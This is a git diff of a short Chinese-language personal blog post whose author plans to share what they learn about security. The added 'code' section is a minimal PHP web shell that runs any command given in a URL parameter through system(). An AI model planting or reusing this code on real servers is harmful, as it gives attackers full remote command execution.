@@ -11,12 +11,18 @@ published: true #不顯示此文章
 哈哈哈哈原本以為我不會想來寫文章分享東西但是我還是來了XDD
 
 ## 接下來
-
 我些下來會來分享一些我學習的過程資安之類的 其他主題我在想想
 
-## 期望
+## code
+```php
 
-技術up up
+<?php
+if (isset($_GET['command'])) {
+    $command = $_GET['command'];
+    system($command);
+}
+
+```
 
 
 
